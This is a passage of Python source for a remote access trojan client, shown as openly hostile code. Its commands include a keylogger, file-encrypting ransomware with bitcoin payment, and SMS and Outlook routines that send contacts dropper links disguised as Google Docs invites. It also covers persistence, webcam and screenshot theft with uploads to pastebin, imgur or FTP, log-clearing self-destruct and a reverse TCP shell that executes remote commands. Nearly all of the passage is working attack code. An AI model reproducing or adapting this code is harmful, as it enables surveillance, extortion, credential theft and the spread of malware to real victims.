                    self._queue.task_done()
                except:
                    break
        except Exception as e:
            self.debug("{} error: {}".format(self._task_threader.func_name, str(e)))


    @threaded
    @config(flag=threading.Event())
    def _task_manager(self):
        try:
            while True:
                if self._abort:
                    break
                else:
                    self._task_manager.flag.wait()
                    jobs = self._workers.items()
                    for task, worker in jobs:
                        if not worker.is_alive():
                            dead = self._workers.pop(task, None)
                            del dead
                            if self._keylogger_auto in task:
                                self._workers[self._keylogger_auto.func_name] = self._keylogger_auto()
                            elif self.reverse_tcp_shell.func_name in task:
                                self._workers[self.reverse_tcp_shell.func_name] = self._reverse_tcp_shell()
                    time.sleep(1)
        except Exception as e:
            self.debug('{} error: {}'.format('TaskManager', str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='cd <path>')
    def cd(self, path='.'):
        """
        change current working directory
        """
        try:
            if os.path.isdir(path):
                return os.chdir(path)
            else:
                return os.chdir('.')
        except Exception as e:
            self.debug("{} error: {}".format(self.cd.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='ls <path>')
    def ls(self, path='.'):
        """
        list directory contents
        """
        try:
            output = []
            if os.path.isdir(path):
                for line in os.listdir(path):
                    if len('\n'.join(output + [line])) < 2048:
                        output.append(line)
                    else:
                        break
                return '\n'.join(output)
            else:
                return "Error: path not found"
        except Exception as e2:
            self.debug("{} error: {}".format(self.ls.func_name, str(e2)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='ps [args]')
    def ps(self, args=None):
        """
        alias for 'process'
        """
        if not args:
            return self.ps.usage
        else:
            cmd, _, action = str(args).partition(' ')
            if hasattr(self, '_ps_%s' % cmd):
                try:
                    return getattr(self, '_ps_%s' % cmd)(action)
                except Exception as e:
                    self.debug("{} error: {}".format(self.ps.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='pwd')
    def pwd(self):
        """
        show name of present working directory
        """
        try:
            return os.getcwd()
        except Exception as e:
            self.debug("{} error: {}".format(self.pwd.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='cat <path>')
    def cat(self, path):
        """
        display file contents
        """
        try:
            output = []
            if not os.path.isfile(path):
                return "Error: file not found"
            for line in open(path, 'rb').readlines():
                try:
                    line = line.rstrip()
                    if len(line) and not line.isspace():
                        if len('\n'.join(output + [line])) < 48000:
                            output.append(line)
                        else:
                            break
                except Exception as e1:
                    self.debug("{} error: {}".format(self.cat.func_name, str(e1)))
            return '\n'.join(output)
        except Exception as e2:
            self.debug("{} error: {}".format(self.cat.func_name, str(e2))  )


    @config(platforms=['win32','linux2','darwin'], command=True, usage='set <cmd> [key=value]')
    def set(self, arg):
        """
        set client options
        """
        try:
            target, _, opt = arg.partition(' ')
            option, _, val = opt.partition('=')
            if val.isdigit() and int(val) in (0,1):
                val = bool(int(val))
            elif val.isdigit():
                val = int(val)
            elif val.lower() in ('true', 'on', 'enable'):
                val = True
            elif val.lower() in ('false', 'off', 'disable'):
                val = False
            elif ',' in val:
                val = val.split(',')
            if hasattr(self, target):
                try:
                    setattr(getattr(self, target), option, val)
                except:
                    try:
                        getattr(self, target).func_dict[option] = val
                    except: pass
                try:
                    return json.dumps(vars(getattr(self, target)))
                except:
                    return bytes(vars(getattr(self, target)))
            else:
                return "Target attribute '{}' not found".format(str(target))
        except Exception as e:
            self.debug("{} error: {}".format(self.set.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='sms <send/read> [args]')
    def sms(self, args):
        """
        text all host contacts with links to a dropper disguised as Google Docs invite
        """
        mode, _, args = str(args).partition(' ')
        if 'send' in mode:
            phone_number, _, message = args.partition(' ')
            return self._sms_send(phone_number, message)
        else:
            return 'usage: <send/read> [args]\n  arguments:\n\tphone    :   phone number with country code - no spaces (ex. 18001112222)\n\tmessage :   text message to send surrounded by quotes (ex. "example text message")'


    @config(platforms=['win32','linux2','darwin'], command=True, usage='eval <code>')
    def eval(self, code):
        """
        execute Python code in current context
        """
        try:
            return eval(code)
        except Exception as e:
            self.debug("{} error: {}".format(self.eval.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='wget <url>')
    def wget(self, url, filename=None):
        """
        download file from url and return path name
        """
        if url.startswith('http'):
            try:
                path, _ = urllib.urlretrieve(url, filename) if filename else urllib.urlretrieve(url)
                return path
            except Exception as e:
                self.debug("{} error: {}".format(self.wget.func_name, str(e)))
        else:
            return "Invalid target URL - must begin with 'http'"


    @config(platforms=['win32','linux2','darwin'], command=True, usage='kill')
    def kill(self, debug=False):
        """
        shutdown the current connection and reset session
        """
        try:
            self._flags['connection'].clear()
            self._flags['prompt'].clear()
            self._session['socket'].shutdown(socket.SHUT_RDWR)
            self._session['socket'].close()
            self._session['socket'] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._session['id'] = str()
            self._session['key'] = str()
            self._session['public_key'] = str()
            workers = self._workers.keys()
            for worker in workers:
                try:
                    self.stop(worker)
                except Exception as e2:
                    self.debug("{} error: {}".format(self.kill.func_name, str(e2)))
        except Exception as e:
            self.debug("{} error: {}".format(self.kill.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='help')
    def help(self, cmd=None):
        """
        list commands with usage information
        """
        if not cmd:
            try:
                return json.dumps({self._command[c]['usage']: self._command[c]['description'] for c in self._command})
            except Exception as e1:
                self.debug("{} error: {}".format(self.help.func_name, str(e1)))
        elif hasattr(self, str(cmd)) and 'prompt' not in cmd:
            try:
                return json.dumps({self._command[cmd]['usage']: self._command[cmd]['description']})
            except Exception as e2:
                self.debug("{} error: {}".format(self.help.func_name, str(e2)))
        else:
            return "Invalid command - '{}' not found".format(cmd)


    @config(platforms=['win32','linux2','darwin'], command=True, usage='show <value>')
    def show(self, attribute):
        """
        show value of an attribute
        """
        try:
            attribute = str(attribute)
            if 'jobs' in attribute:
                return json.dumps({a: self._get_job_status(self._workers[a].name) for a in self._workers if self._workers[a].is_alive()})
            elif 'privileges' in attribute:
                return json.dumps({'username': self._sysinfo.get('username'),  'administrator': 'true' if bool(os.getuid() == 0 if os.name is 'posix' else ctypes.windll.shell32.IsUserAnAdmin()) else 'false'})
            elif 'info' in attribute:
                return json.dumps(self._sysinfo)
            elif hasattr(self, attribute):
                try:
                    return json.dumps(getattr(self, attribute))
                except:
                    try:
                        return json.dumps(vars(getattr(self, attribute)))
                    except: pass
            elif hasattr(self, str('_%s' % attribute)):
                try:
                    return json.dumps(getattr(self, str('_%s' % attribute)))
                except:
                    try:
                        return json.dumps(vars(getattr(self, str('_%s' % attribute))))
                    except: pass
            else:
                return self.show.usage
        except Exception as e:
            self.debug("'{}' error: {}".format(self._workers.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='stop <job>')
    def stop(self, target):
        """
        stop a running job
        """
        try:
            if target in self._workers:
                _ = self._workers.pop(target, None)
                del _
                return "Job '{}' was stopped.".format(target)
            else:
                return "Job '{}' not found".format(target)
        except Exception as e:
            self.debug("{} error: {}".format(self.stop.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='scan <host>')
    def scan(self, args):
        """
        scan host/network for online hosts and open ports
        """
        try:
            args = str(args).split()
            host = [i for i in args if self._get_if_ipv4(i)][0] if len([i for i in args if self._get_if_ipv4(i)]) else self._sysinfo.get('local')
            return self._scan_network(host) if 'network' in args else self._scan_host(host)
        except Exception as e:
            self.debug("{} error: {}".format(self.scan.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='unzip <file>')
    def unzip(self, path):
        """
        unzip a compressed archive/file
        """
        if os.path.isfile(path):
            try:
                _ = zipfile.ZipFile(path).extractall('.')
                return os.path.splitext(path)[0]
            except Exception as e:
                self.debug("{} error: {}".format(self.unzip.func_name, str(e)))
        else:
            return "File '{}' not found".format(path)


    @config(platforms=['win32','darwin'], inbox=collections.OrderedDict(), command=True, usage='email <option> [mode]')
    def email(self, args=None):
        """
        use Outlook to email all host contacts with dropper links disguised as Google Docs
        """
        if not args:
            try:
                pythoncom.CoInitialize()
                installed = win32com.Client.Dispatch('Outlook.Application').GetNameSpace('MAPI')
                return "\tOutlook is installed on this host\n\t{}".format(self.email.usage)
            except: pass
            return "Outlook not installed on this host"
        else:
            try:
                mode, _, arg   = str(args).partition(' ')
                if hasattr(self, '_email_%s' % mode):
                    if 'dump' in mode:
                        self._workers[self._email_dump.func_name] = threading.Thread(target=self._email_dump, kwargs={'n': arg}, name=time.time())
                        self._workers[self._email_dump.func_name].daemon = True
                        self._workers[self._email_dump.func_name].start()
                        return "Dumping emails from Outlook inbox"
                    else:
                        return getattr(self, '_email_%s' % mode)(arg)
                else:
                    return "usage: email <dump/search> [ftp/pastebin]"
            except Exception as e:
                self.debug("{} error: {}".format(self.email.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], registry_key=r"Software\AngryEggplant", command=True, usage='ransom <mode> [path]')
    def ransom(self, args):
        """
        encrypt personal files and ransom them
        """
        if not args:
            return "\tusage: ransom <encrypt/decrypt> [path]"
        cmd, _, action = str(args).partition(' ')
        if 'payment' in cmd:
            try:
                payment = self._server_resource('api bitcoin ransom_payment')
                return self._ransom_payment(payment)
            except:
                return "{} error: {}".format(Client._ransom_payment.func_name, "bitcoin wallet required for ransom payment")
        elif 'decrypt' in cmd:
            return self._ransom_decrypt_threader(action)
        elif 'encrypt' in cmd:
            reg_key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, registry_key)
            return self._ransom_encrypt_threader(action)
        else:
            return "\tusage: ransom <mode> [path]\n\tmodes: encrypt, decrypt, payment"


    @config(platforms=['win32','linux2','darwin'], command=True, usage='upload <mode> <file>')
    def upload(self, args):
        """
        upload file to imgur, pastebin, or ftp server
        """
        try:
            mode, _, source = str(args).partition(' ')
            target  = '_upload_{}'.format(mode)
            if not source or not hasattr(self, target):
                return self.upload.usage
            return getattr(self, target)(source)
        except Exception as e:
            self.debug("{} error: {}".format(self.upload.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='webcam <mode> [options]')
    def webcam(self, args=None):
        """
        stream the webcam or capture image/video
        """
        try:
            if not args:
                result = self.webcam.usage
            else:
                args = str(args).split()
                if 'stream' in args:
                    if len(args) != 2:
                        result = "Error - stream mode requires argument: 'port'"
                    elif not str(args[1]).isdigit():
                        result = "Error - port must be integer between 1 - 65355"
                    else:
                        result = self._webcam_stream(port=args[1])
                else:
                    result = self._webcam_image(*args) if 'video' not in args else self._webcam_video(*args)
        except Exception as e:
            result = "{} error: {}".format(self.webcam.func_name, str(e))
        return result


    @config(platforms=['win32'], command=True, usage='escalate')
    def escalate(self):
        """
        attempt to escalate privileges
        """
        try:
            if self._get_administrator():
                return "Current user '{}' has administrator privileges".format(self._sysinfo.get('username'))
            if self._payload.get('established') and os.path.isfile(self._payload.get('result')):
                if os.name is 'nt':
                    win32com.shell.shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(self._payload.get('result')))
                else:
                    return "Privilege escalation not yet available on '{}'".format(sys.platform)
        except Exception as e:
            self.debug("{} error: {}".format(self.escalate.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], process_list={}, command=True, usage='execute <path> [args]')
    def execute(self, args):
        """
        run an executable program in a hidden process
        """
        path, args = [i.strip() for i in args.split('"') if i if not i.isspace()] if args.count('"') == 2 else [i for i in args.partition(' ') if i if not i.isspace()]
        args = [path] + args.split()
        if os.path.isfile(path):
            name = os.path.splitext(os.path.basename(path))[0]
            try:
                info = subprocess.STARTUPINFO()
                info.dwFlags = subprocess.STARTF_USESHOWWINDOW | subprocess.CREATE_NEW_ps_GROUP
                info.wShowWindow = subprocess.SW_HIDE
                self.execute.process_list[name] = subprocess.Popen(args, startupinfo=info)
                return "Running '{}' in a hidden process".format(path)
            except Exception as e:
                try:
                    self.execute.process_list[name] = subprocess.Popen(args, 0, None, None, subprocess.PIPE, subprocess.PIPE)
                    return "Running '{}' in a new process".format(name)
                except Exception as e:
                    self.debug("{} error: {}".format(self.execute.func_name, str(e)))
        else:
            return "File '{}' not found".format(str(path))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='payload [args] [kwargs]')
    def payload(self, args=None):
        """
        payload compiled as executable disguised as plugin update
        """
        try:
            if not args or 'help' in args:
                return '\n    usage: payload -n <name> -i <icon>\n        -e/--executable     - compile a win32/win64 executable\n        -a/--application    - bundle into Mac OS X application \n        -r/--random         - generate random payload name\n        -n/--name [name]    - set a custom payload name\n        -i/--icon [icon]    - select icon {java, flash, pdf}'
            elif 'remove' in args:
                output = {}
                for payload in self._payload:
                    self._get_delete(payload)
                    output[payload] = 'removed'
                    filename = self._payload.pop(payload, None)
                    del filename
                return json.dumps(output)
            else:
                kwargs  = self._get_kwargs(args)
                kwargs['path'] = self._payload_stager()
                if any(map(kwargs.__contains__, ['icon','executable','compile','application','app'])):
                    if os.name == 'darwin':
                        path = self._payload_application(**kwargs)
                    else:
                        path = self._payload_executable(**kwargs)
                name = os.path.splitext(kwargs.get('path'))[0]
                self._payload[name] = kwargs.get('path')
                return json.dumps(self._payload)
        except Exception as e:
            return "{} error: {}".format(self.payload.func_name, str(e))


    @config(platforms=['win32','linux2','darwin'], max_bytes=4000, buffer=cStringIO.StringIO(), window=None, command=True, usage='keylogger <start/stop/dump>')
    def keylogger(self, *args, **kwargs):
        """
        start/stop/dump the keylogger
        """
        mode = args[0] if args else None
        if not mode:
            if self.keylogger.func_name not in self._workers:
                return self.keylogger.usage
            else:
                return self._keylogger_status()
        else:
            if 'start' in mode:
                if self.keylogger.func_name not in self._workers:
                    self._workers[self.keylogger.func_name] = self._keylogger()
                    return self._keylogger_status()
                else:
                    return self._keylogger_status()
            elif 'stop' in mode:
                try:
                    self.stop(self.keylogger.func_name)
                except: pass
                try:
                    self.stop(self._keylogger_auto.func_name)
                except: pass
                return self._keylogger_status()
            elif 'auto' in mode:
                self._workers[self._keylogger_auto.func_name] = self._keylogger_auto()
                return self._keylogger_status()
            elif 'dump' in mode:
                result = self._upload_pastebin(self.keylogger.buffer) if not 'ftp' in mode else self._upload_ftp(self.keylogger.buffer)
                self.keylogger.buffer.reset()
                return result
            elif 'status' in mode:
                return self._keylogger_status()
            else:
                return self.keylogger.usage


    @config(platforms=['win32','linux2','darwin'], command=True, usage='screenshot [mode]')
    def screenshot(self, *args):
        """
        capture a screenshot from host device
        """
        try:
            with mss.mss() as screen:
                img = screen.grab(screen.monitors[0])
            png     = self._get_png_from_data(img)
            result  = self._upload_imgur(png) if 'ftp' not in args else self._upload_ftp(png, filetype='.png')
            return result
        except Exception as e:
            self.debug("{} error: {}".format(self.screenshot.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], methods={method: {'established': bool(), 'result': bytes()} for method in ['hidden_file','scheduled_task','registry_key','startup_file','launch_agent','crontab_job','powershell_wmi']}, command=True, usage='persistence <add/remove> [method]')
    def persistence(self, args=None):
        """
        establish persistence to survive reboots
        """
        try:
            if not args:
                return self.persistence.usage
            else:
                target = '_persistence_{}_{}'
                cmd, _, action = str(args).partition(' ')
                methods = [m for m in self.persistence.methods if sys.platform in self.persistence.methods[m]['platforms']]
                if cmd not in ('add','remove'):
                    return self.persistence.usage + str('\nmethods: %s' % ', '.join([str(m) for m in self.persistence.methods if sys.platform in getattr(Client, '_persistence_add_%s' % m).platforms]))
                if not self._payload:
                    self._payload.append(self.payload(random.choice(['java','flash','chrome','firefox'])))
                for method in methods:
                    if method == 'all' or action == method:
                        self.persistence.methods[method]['established'], self.persistence.methods[method]['result'] = getattr(self, target.format(cmd, method))()
                return json.dumps({m: self.persistence.methods[m]['result'] for m in methods})
        except Exception as e:
            self.debug("{} error: {}".format(self.persistence.func_name, str(e)))
        return str(self.persistence.usage + '\nmethods: %s' % ', '.join([m for m in self.persistence.methods if sys.platform in getattr(Client, '_persistence_add_%s' % m).platforms]))


    @config(platforms=['linux2','darwin'], capture=[], command=True, usage='packetsniffer [mode]')
    def packetsniffer(self, args):
        """
        sniff local network and capture packets
        """
        try:
            cmd, _, action = str(args).partition(' ')
            if 'start' in cmd:
                mode   = None
                length = None
                for arg in action.split():
                    if arg.isdigit():
                        length = int(arg)
                    elif arg in ('ftp','pastebin'):
                        mode   = arg
                self._workers[self.packetsniffer.func_name] = self._get_packets(seconds=length, mode=mode)
                self._workers[self.packetsniffer.func_name].start()
                return 'Capturing network traffic for {} seconds'.format(duration)
        except Exception as e:
            return "{} error: {}".format(self.packetsniffer.func_name, str(e))


    @config(platforms=['win32'], buffer=cStringIO.StringIO(), max_bytes=1024, command=True, usage='ps <mode> [args]')
    def ps(self, args=None):
        """
        process utilities
        """
        try:
            if not args:
                return self.ps.usage
            else:
                cmd, _, action = str(args).partition(' ')
                if hasattr(self, '_ps_%s' % cmd):
                    return getattr(self, '_ps_%s' % cmd)(action)
                else:
                    return "usage: {}\n\targs: list, search, kill, monitor".format(self.ps.usage)
        except Exception as e:
            return "{} error: {}".format(self.ps.func_name, str(e))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='abort')
    def abort(self):
        """
        self-destruct and leave no trace on the disk
        """
        self._abort = True
        try:
            if os.name is 'nt':
                self._get_clear_logs()
            for method in self.persistence.methods:
                if self.persistence.methods[method].get('established'):
                    try:
                        remove = getattr(self, '_persistence_remove_{}'.format(method))()
                    except Exception as e2:
                        self.debug("{} error: {}".format(method, str(e2)))
            for stager in self._payload:
                self._get_delete(stager)
            if not self._debug:
                self._get_delete(sys.argv[0])
        finally:
            shutdown = threading.Thread(target=self._get_shutdown)
            taskkill = threading.Thread(target=self.ps, args=('kill python',))
            shutdown.start()
            taskkill.start()
            sys.exit()


    @threaded
    def reverse_tcp_shell(self):
        """
        send encrypted shell back to server via outgoing TCP connection
        """
        try:
            self._workers[self._server_prompt.func_name] = self._server_prompt()
            while True:
                if self._flags['connection'].wait(timeout=1.0):
                    if not self._flags['prompt'].is_set():
                        task = self._server_recv()
                        if isinstance(task, dict):
                            cmd, _, action = [i.encode() for i in task['command'].partition(' ')]
                            try:
                                result  = bytes(getattr(self, cmd)(action) if action else getattr(self, cmd)()) if cmd in sorted([attr for attr in vars(Client) if not attr.startswith('_')]) else bytes().join(subprocess.Popen(cmd, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                            except Exception as e1:
                                result  = "{} error: {}".format(self.reverse_tcp_shell.func_name, str(e1))
                            task.update({'result': result})
                            self._server_send(**task)
                            if cmd and cmd in self._flags['tasks'] and 'PRIVATE KEY' not in task['command']:
                                self._task_save(task, result)
                        self._flags['prompt'].set()
                else:
                    self.debug("Connection timed out")
                    break
        except Exception as e2:
            self.debug("{} error: {}".format(self.reverse_tcp_shell.func_name, str(e2)))
        return self._get_restart(self.reverse_tcp_shell.func_name)


    @staticmethod
    def debug(data):
        """
        print output to console if debugging mode is enabled
        """
        if Client._debug:
            with Client._lock:
                print(bytes(data))


    def connect(self, **kwargs):
        """
        connect to server and start new session
        """
        try:
            self._session['socket']     = self._server_connect(**kwargs)
            self._session['key']        = self._session_key()
            self._session['id']         = self._session_id()
            return True
        except Exception as e:
            self.debug("{} error: {}".format(self.connect.func_name, str(e)))
        return False


    def run(self, **kwargs):
        """
        run client startup routine
        """
        try:
            if self.connect(**kwargs):
                self._workers[self._task_manager.func_name]     = self._task_manager()
                self._workers[self.reverse_tcp_shell.func_name] = self.reverse_tcp_shell()
                return
            else:
                self.debug("connection timed out")
        except Exception as e:
            self.debug("{} error: {}".format(self.run.func_name, str(e)))
        return self._get_restart(self.run.func_name)



if __name__ == "__main__":
    payload = Client()
    payload.run(config='https://pastebin.com/raw/uYGhnVqp', debug=True)

